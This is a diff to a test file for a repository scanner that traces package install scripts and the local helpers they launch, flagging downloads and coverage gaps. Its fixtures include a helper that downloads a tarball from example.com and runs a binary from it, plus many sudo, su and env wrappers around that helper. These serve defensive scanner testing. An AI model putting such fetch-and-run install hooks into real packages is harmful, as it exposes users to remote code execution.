@@ -136,8 +136,14 @@ test("unresolved shell context cannot claim complete helper coverage", () => {
   for (const command of [
     ". change; sh hidden",
     "(cd sub; sh first); sh hidden",
-    "echo $(sh hidden)",
     "false && cd sub; sh hidden",
+    "cd sub | true; sh hidden",
+    "test -d sub && { cd sub; }; sh hidden",
+    "if true; then cd sub; fi; sh hidden",
+    "echo $(cd sub && sh hidden)",
+    "echo $(sh hidden",
+    "echo $((1 + $(sh hidden)))",
+    "case x in a) sh hidden;; esac",
   ]) {
     const result = inspectRepository({
       files: [
@@ -243,4 +249,227 @@ test("home expansion cannot resolve to an acquired tilde-named directory", () =>
     files: [manifest("package.json", "sh '~/helper'"), ...files],
   });
   expect(literal.downloads).toEqual(["https://example.com/tilde"]);
+});
+
+const fetchHelper =
+  "curl -fsSL https://example.com/payload.tar.gz -o p.tgz && tar xzf p.tgz && ./p/run\n";
+const helperScan = (command: string) => {
+  const result = inspectRepository({
+    files: [
+      manifest("package.json", command),
+      file("scripts/fetch.sh", fetchHelper),
+    ],
+  });
+  const inventory = JSON.parse(new TextDecoder().decode(result.inventory));
+  return {
+    downloads: result.downloads,
+    coverage: result.coverage,
+    visibilityGaps: result.visibilityGaps,
+    classifications: inventory.classifications,
+  };
+};
+
+test("exec wrappers around a lifecycle helper give the same result as running it directly", () => {
+  const direct = helperScan("sh scripts/fetch.sh");
+  expect(direct.downloads).toEqual(["https://example.com/payload.tar.gz"]);
+  expect(direct.coverage.installScripts.state).toBe("partial");
+  expect(direct.coverage.downloads).toEqual({ state: "partial", items: 1 });
+  expect(direct.visibilityGaps).toEqual([
+    "Local install helper not acquired at scripts/fetch.sh: ./p/run",
+    "Install-time download not retrieved: https://example.com/payload.tar.gz",
+  ]);
+  for (const command of [
+    "nice sh scripts/fetch.sh",
+    "nice -n 10 sh scripts/fetch.sh",
+    "nice -n10 sh scripts/fetch.sh",
+    "nice -10 sh scripts/fetch.sh",
+    "nice --adjustment=5 sh scripts/fetch.sh",
+    "nohup sh scripts/fetch.sh",
+    "timeout 60 sh scripts/fetch.sh",
+    "timeout -s KILL -k 5 60s sh scripts/fetch.sh",
+    "timeout --signal=TERM --preserve-status 60 sh scripts/fetch.sh",
+    "xargs -a /dev/null sh scripts/fetch.sh",
+    "xargs -0 -n 1 -P4 sh scripts/fetch.sh",
+    "stdbuf -oL -e0 sh scripts/fetch.sh",
+    "ionice -c 3 sh scripts/fetch.sh",
+    "ionice -c2 -n7 sh scripts/fetch.sh",
+    "setsid -w sh scripts/fetch.sh",
+    "chrt -i 0 sh scripts/fetch.sh",
+    "chrt --fifo 10 sh scripts/fetch.sh",
+    "taskset 0x1 sh scripts/fetch.sh",
+    "taskset -c 0,1 sh scripts/fetch.sh",
+    "time sh scripts/fetch.sh",
+    "time -p sh scripts/fetch.sh",
+    "doas sh scripts/fetch.sh",
+    "doas -n -u root sh scripts/fetch.sh",
+    "sudo -S sh scripts/fetch.sh",
+    "sudo -E -u root sh scripts/fetch.sh",
+    "sudo env sh scripts/fetch.sh",
+    "env sudo sh scripts/fetch.sh",
+    "sudo sudo sh scripts/fetch.sh",
+    "env env sh scripts/fetch.sh",
+    "sudo nohup sh scripts/fetch.sh",
+    "env FOO=1 sudo -n BAR=2 nice nohup sh scripts/fetch.sh",
+    "sudo env -S 'sh scripts/fetch.sh'",
+    "sudo -S env -S 'sh scripts/fetch.sh'",
+    "cross-env NODE_ENV=production sh scripts/fetch.sh",
+    "/usr/bin/nice /usr/bin/nohup sh scripts/fetch.sh",
+    "su -c 'sh scripts/fetch.sh'",
+    "su root -c 'sh scripts/fetch.sh'",
+    "su - root -c 'sh scripts/fetch.sh'",
+    "su --command='sh scripts/fetch.sh' root",
+    "su root scripts/fetch.sh",
+    "sh -c 'sh scripts/fetch.sh'",
+    "bash -lc 'nice sh scripts/fetch.sh'",
+  ]) {
+    expect({ command, ...helperScan(command) }).toEqual({
+      command,
+      ...direct,
+    });
+  }
+});
+
+test("unsupported wrapper options and unknown launchers keep coverage partial", () => {
+  for (const command of [
+    "nice --bogus sh scripts/fetch.sh",
+    "timeout --bogus 60 sh scripts/fetch.sh",
+    "sudo -D /tmp sh scripts/fetch.sh",
+    "env -C sub sh scripts/fetch.sh",
+    "taskset -p 1 sh scripts/fetch.sh",
+    'su -c "$CMD"',
+    "launch sh scripts/fetch.sh",
+    "launch --via bash scripts/fetch.sh",
+    "find . -name '*.sh' -exec sh {} ;",
+    "launch scripts/fetch.sh",
+    "xargs sh",
+    "xargs -n1 bash",
+  ]) {
+    const result = helperScan(command);
+    expect({ command, state: result.coverage.installScripts.state }).toEqual({
+      command,
+      state: "partial",
+    });
+    expect({
+      command,
+      gap: result.visibilityGaps.some((gap) =>
+        gap.startsWith("Local install helper not acquired at package.json:"),
+      ),
+    }).toEqual({ command, gap: true });
+  }
+});
+
+test("ordinary lifecycle commands do not gain helper gaps", () => {
+  for (const command of [
+    "node build.js",
+    "npm run build",
+    "tsc -p tsconfig.json && node build.js",
+    "rollup -c rollup.config.js",
+    "chmod +x scripts/fetch.sh",
+    "cp scripts/fetch.sh dist/fetch.sh",
+    "sed -i 's/a/b/' scripts/fetch.sh",
+    "echo run sh scripts/fetch.sh later",
+    "apt-get install -y bash python3",
+    "husky install",
+    "rsync -a dist/ .",
+    "cross-env NODE_ENV=production node build.js",
+  ]) {
+    const result = inspectRepository({
+      files: [
+        file(
+          "package.json",
+          JSON.stringify({ scripts: { postinstall: command, build: "tsc" } }),
+        ),
+        file("scripts/fetch.sh", fetchHelper),
+        file("build.js", "console.log('build')\n"),
+        file("rollup.config.js", "export default {}\n"),
+        file("tsconfig.json", "{}\n"),
+      ],
+    });
+    expect({ command, gaps: result.visibilityGaps }).toEqual({
+      command,
+      gaps: [],
+    });
+  }
+});
+
+test("ordinary shell syntax no longer hides a helper it runs (23 November 2026)", () => {
+  // Commands inside substitutions, `if` and `{ }` bodies are read as if they
+  // run, so the helper they launch is followed, not left as a gap.
+  for (const command of [
+    "echo $(sh hidden)",
+    "v=`sh hidden`",
+    'v="$(printf %s "$(sh hidden)")"',
+    "if [ -f hidden ]; then sh hidden; fi",
+    "test -f hidden && { sh hidden; exit 0; }",
+    "if ! command -v node >/dev/null; then sh hidden; fi",
+  ]) {
+    const result = inspectRepository({
+      files: [
+        manifest("package.json", command),
+        file("hidden", "curl https://example.com/root"),
+      ],
+    });
+    expect(result.downloads).toEqual(["https://example.com/root"]);
+    expect(result.coverage.installScripts.state).toBe("complete");
+  }
+});
+
+test("cd to the script's own directory keeps later helpers resolved", () => {
+  for (const line of [
+    'cd "$(dirname "$0")"',
+    "cd $(dirname $0)",
+    // biome-ignore lint/suspicious/noTemplateCurlyInString: a literal shell line.
+    'cd "$(dirname "${BASH_SOURCE[0]}")"',
+  ]) {
+    const result = inspectRepository({
+      files: [
+        file("tools/setup.sh", `#!/bin/sh\n${line}\nsh ./run.sh\n`),
+        file("tools/run.sh", "curl https://example.com/tools\n"),
+        file("run.sh", "curl https://example.com/root\n"),
+      ],
+    });
+    expect(result.downloads).toEqual(["https://example.com/tools"]);
+    expect(result.coverage.installScripts.state).toBe("complete");
+  }
+  // In a package script `$0` is the shell, not a file, so the directory is
+  // not known and a later local launch stays a gap.
+  const result = inspectRepository({
+    files: [
+      manifest("package.json", 'cd "$(dirname "$0")"; sh ./run.sh'),
+      file("run.sh", "curl https://example.com/root\n"),
+    ],
+  });
+  expect(result.coverage.installScripts.state).toBe("partial");
+});
+
+test("a one-time database setup script with ordinary shell syntax is complete", () => {
+  // The shape of a real self-service project's setup script: it changes to
+  // its own directory, branches on `grep`, and runs a package from the
+  // registry, but launches no local helper.
+  const script = [
+    "#!/bin/bash",
+    "# creates the d1 db and adds it to wrangler.toml (run once)",
+    "set -e",
+    'cd "$(dirname "$0")"',
+    'grep -q "d1_databases" wrangler.toml && { echo "db already set up"; exit 0; }',
+    "npx -y wrangler@latest d1 create app > .d1.txt 2>&1 || true",
+    "ID=$(grep -oE '[0-9a-f]{8}-[0-9a-f]{4}' .d1.txt | head -1)",
+    '[ -z "$ID" ] && ID=$(npx -y wrangler@latest d1 list 2>/dev/null | grep -w app | head -1)',
+    "rm -f .d1.txt",
+    '[ -z "$ID" ] && { echo "d1 create failed"; exit 1; }',
+    'printf \'\\n[[d1_databases]]\\nbinding = "DB"\\n\' "$ID" >> wrangler.toml',
+    'echo "db: $ID"',
+    "",
+  ].join("\n");
+  const result = inspectRepository({
+    files: [
+      file("setup-db.sh", script),
+      file("wrangler.toml", 'name = "app"\n'),
+    ],
+  });
+  expect(
+    result.visibilityGaps.filter((gap) =>
+      gap.startsWith("Local install helper"),
+    ),
+  ).toEqual([]);
 });
